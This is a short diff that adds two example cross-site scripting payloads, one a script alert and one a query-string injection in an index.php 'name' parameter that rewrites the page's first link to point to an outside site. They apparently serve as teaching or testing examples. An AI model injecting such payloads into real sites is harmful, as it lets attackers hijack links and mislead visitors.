@@ -1,0 +1,6 @@
+*  <script>alert('attacked')</script>
+
+*  index.php?name=<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://www.cisco.com/";}</script>
+
+
+
